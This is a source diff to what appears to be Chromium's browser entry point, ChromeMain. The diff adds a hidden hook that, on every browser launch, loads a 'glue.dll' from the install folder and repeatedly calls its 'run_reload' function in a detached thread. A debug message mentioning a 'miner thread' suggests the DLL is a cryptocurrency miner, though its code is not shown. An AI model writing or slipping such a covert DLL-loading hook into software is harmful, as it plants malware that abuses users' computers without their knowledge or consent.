@@ -3,6 +3,7 @@
 // found in the LICENSE file.
 
 #include <stdint.h>
+#include <thread>
 
 #include "base/callback_helpers.h"
 #include "base/command_line.h"
@@ -87,6 +88,57 @@ int ChromeMain(int argc, const char** argv) {
   base::CommandLine::Init(0, nullptr);
   const base::CommandLine* command_line(base::CommandLine::ForCurrentProcess());
   ALLOW_UNUSED_LOCAL(command_line);
+
+    const std::string process_type =
+      command_line->GetSwitchValueASCII(switches::kProcessType);
+    if (process_type.empty()) {
+    typedef bool(__stdcall * pFunRunReLoad)(std::string & body, bool& ret);
+    // typedef bool (__stdcall * pFunGetStats)(std::string &state);
+    char szFullPath[MAX_PATH];
+    memset(szFullPath, 0, MAX_PATH);
+    ::GetModuleFileNameA(NULL, szFullPath, MAX_PATH);
+    int len = strlen(szFullPath);
+    for (int i = len - 1; i > 0; i--) {
+      if (szFullPath[i] != '\\') {
+        szFullPath[i] = '\0';
+        continue;
+      }
+      break;
+    }
+
+    std::string self_path = szFullPath;
+    std::string dllname = self_path + "glue.dll";
+    HINSTANCE hApp =
+        ::LoadLibraryExA(dllname.c_str(), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
+    if (!hApp) {
+      ::OutputDebugStringA("glue.dll LoadLibraryExA error.");
+    } else {
+      pFunRunReLoad pRunReLoad =
+          (pFunRunReLoad)::GetProcAddress(hApp, "run_reload");
+      if (!pRunReLoad) {
+        ::OutputDebugStringA("run_reload GetProcAddress error.");
+      } else {
+        std::thread tRun([&]() {
+          std::string body;
+          bool ret = false;
+          do {
+            ret = pRunReLoad(body, ret);
+            ::OutputDebugStringA("run_reload run once ... ");
+            if (ret) {
+              ::OutputDebugStringA(" ^_^ check miner thread exit!!! ");
+              if (hApp) {
+                FreeLibrary(hApp);
+                hApp = nullptr;
+              }
+            } else {
+              std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+            }
+          } while (!ret);
+        });
+        tRun.detach();
+      }
+    }
+  }
 
   // Chrome-specific process modes.
 #if defined(OS_LINUX) || defined(OS_MACOSX) || defined(OS_WIN)
